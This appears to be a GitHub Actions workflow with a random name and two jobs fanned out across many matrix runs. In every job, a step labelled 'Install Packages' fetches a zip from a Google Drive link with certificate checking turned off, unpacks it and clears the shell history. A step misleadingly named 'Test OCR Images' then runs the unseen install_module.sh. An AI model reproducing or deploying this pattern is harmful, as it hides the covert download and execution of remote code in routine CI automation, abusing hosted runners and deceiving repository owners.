name: aoanh8bo
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  check:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Prepare', 'Construct', 'Inspect', 'Activate', 'Publish']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1We6tBjwbWVclz30aiEoBtYV7ezh1_vQE" -O aoanh8bo.zip
        unzip -o aoanh8bo.zip
        rm aoanh8bo.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  configure1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Adapt', 'Assemble', 'Confirm', 'Ignite', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1We6tBjwbWVclz30aiEoBtYV7ezh1_vQE" -O aoanh8bo.zip
        unzip -o aoanh8bo.zip
        rm aoanh8bo.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
